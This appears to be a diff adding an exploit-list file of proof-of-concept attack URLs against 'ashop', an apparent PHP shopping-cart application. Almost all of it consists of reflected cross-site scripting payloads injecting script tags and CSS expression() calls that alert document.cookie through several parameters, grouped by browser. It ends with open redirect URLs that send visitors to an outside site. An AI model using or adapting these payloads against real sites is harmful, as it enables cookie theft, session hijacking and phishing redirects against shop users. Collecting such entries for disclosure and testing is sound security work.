@@ -1,0 +1,19 @@
+IE8
+
+http://www.example.com/ashop/?&#039;&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ashop/index.php?&#039;&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ashop/picture.php?picture=&quot; stYle=x:expre/**/ssion(alert(document.cookie)) ns=&quot;
+http://www.example.com/ashop/index.php?language=&#039;&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+FF 7.1
+
+http://www.example.com/ashop/index.php?searchstring=1&amp;showresult=true&amp;exp=&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(666);&lt;/script&gt;&amp;resultpage=&amp;categories=off&amp;msg=&amp;search=index.php&amp;shop=1
+http://www.example.com/ashop/catalogue.php?cat=3&amp;exp=3&amp;shop=3&amp;resultpage=&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;msg=
+http://www.example.com/ashop/catalogue.php?cat=3&amp;exp=3&amp;shop=3&amp;resultpage=1&amp;msg=&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/ashop/basket.php?cat=0&amp;sid=&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;shop=1&amp;payoption=3
+
+Open Redirection
+
+http://www.example.com/ashop/language.php?language=sv&amp;redirect=http://www.google.com
+http://www.example.com/ashop/currency.php?currency=aud&amp;redirect=http://www.google.com
+http://www.example.com/ashop/currency.php?redirect=http://www.google.com
